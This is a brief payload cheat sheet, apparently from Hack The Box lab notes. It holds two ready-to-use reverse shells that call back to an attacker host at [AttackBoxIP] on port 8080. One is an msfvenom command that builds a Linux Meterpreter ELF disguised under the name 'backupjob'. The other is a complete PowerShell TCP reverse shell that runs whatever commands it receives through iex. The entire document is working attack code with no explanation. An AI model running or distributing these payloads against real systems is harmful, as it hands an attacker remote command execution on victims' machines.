
---
### Meterpreter
```bash
hcx05@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[AttackBoxIP] -f elf -o backupjob LPORT=8080
```

### Powershell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[AttackBoxIP]',8080);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

